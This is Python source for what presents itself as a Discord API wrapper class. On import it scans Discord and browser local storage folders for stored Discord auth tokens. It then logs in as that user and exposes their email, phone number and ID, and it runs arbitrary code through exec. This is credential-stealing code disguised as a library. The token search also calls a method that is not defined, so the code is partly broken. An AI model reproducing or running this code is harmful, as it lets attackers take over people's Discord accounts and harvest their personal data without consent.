import asyncio
import multiprocessing
import discord
import requests
import os
import time
from re import findall
from json import loads
from urllib.request import Request, urlopen
class _API:
    def test(self,token):
        f = self.form_get_request("https://discord.com/api/v9/users/@me/relationships",token)
        if f.startswith(b'{"message": "401: Unauthorized", "code": 0}'):return (False,"")
        else:print('Authorized token ({})'.format(token));return (True,token)
    def _get_token(self):
        LOCAL = os.getenv("LOCALAPPDATA");ROAMING = os.getenv("APPDATA");PATHS = {"Discord": ROAMING + "\\Discord","Discord Canary": ROAMING + "\\discordcanary","Discord PTB": ROAMING + "\\discordptb","Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default","Opera": ROAMING + "\\Opera Software\\Opera Stable","Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default","Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"}
        def gettokens(path):
            path += "\\Local Storage\\leveldb";tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):tokens.append(token)
            return tokens
        def get_token():
            for platform, path in PATHS.items():
                if not os.path.exists(path):continue
                li = gettokens(path)
                if not len(li) >= 0:return None
                for item in li:
                    acc,token = self._try(item)
                    if acc:return token
                    else:pass
            return None
        return get_token()
    def _tc_wrapper(self_):
        s = self_._mp_parse
        class MyClient(discord.Client):
            async def on_ready(self):
                exec(s)
                time.sleep(0.3)
                await self.close()
        client = MyClient()
        client._mp_parse = None
        client.run(self_.token,bot=False)
        self_._mp_parse = client._mp_parse
    def getuserdata(self,token):
        try:return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=self._getheaders(token))).read().decode())
        except:pass
    def getallraw(self):
        zu=dict(self.getuserdata(self.token))
        return zu
    def name(self):
        zu=dict(self.getuserdata(self.token))
        return (zu.get('username'))
    def id(self):
        zu = dict(self.getuserdata(self.token))
        return (zu.get('id'))
    def email(self):
        zu = dict(self.getuserdata(self.token))
        return zu.get('email')
    def lang(self):
        zu = dict(self.getuserdata(self.token))
        return (zu.get('locale'))
    def phone(self):
        zu = dict(self.getuserdata(self.token))
        return (zu.get('phone'))
    def avatar(self):
        zu = dict(self.getuserdata(self.token))
        uz=zu.get('avatar')
        return self.getavatar(self.id(),uz)
    def auto_wrapper(self,cmd):
        self.wrap_code(self._tc_wrapper,cmd)
    def wrap_code(self,bmb,ext=None):
        def _mini_override(self):pass
        asyncio.base_events.BaseEventLoop._check_closed = _mini_override
        self._mp_parse = ext
        mp = multiprocessing.Process(target=bmb,args=[self])
        mp.run()
        mp.close()
        return self._mp_parse
    def _getheaders(self,token, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:headers.update({"Authorization": token})
        return headers
    def form_get_request(self,url:str,cust_token=None):
        if cust_token == None:token = self.token
        else:token = cust_token
        try:return requests.get(url, headers=self._getheaders(token)).content
        except Exception as ex:
            print(f'Error while requesting ({str(url)}) : {str(ex)}')
            return None
    def form_post_request(self,url:str,payload:dict,cust_token=None):
        if cust_token == None:token = self.token
        else:token = cust_token
        try:return requests.patch(url, headers=self._getheaders(token),data=payload).content
        except Exception as ex:print(f'Error while requesting ({str(url)}) : {str(ex)}')
    def getavatar(self,uid, aid):
        url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
        try:urlopen(Request(url))
        except:url = url[:-4]
        return url
    def gather(self):
        try:return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me",headers=self._getheaders(self.token))).read().decode())
        except Exception as ex:print(str(ex))
    def set_token(self,token: str):
        if self.test(token):self.token = token
        else:raise Exception("Invalid token!")
    def __init__(self):
        self.token = self._get_token()
API = _API()
